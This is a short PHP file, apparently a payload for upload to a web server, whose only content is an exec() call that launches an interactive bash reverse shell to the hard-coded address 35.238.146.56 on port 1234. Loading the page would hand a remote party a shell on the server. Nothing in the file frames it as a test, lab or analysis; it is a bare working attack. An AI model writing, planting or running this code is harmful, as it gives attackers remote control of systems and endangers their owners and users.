<?php 
$output=null;
$retval=null;
exec('bash -i >& /dev/tcp/35.238.146.56/1234 0>&1', $output, $retval);
?>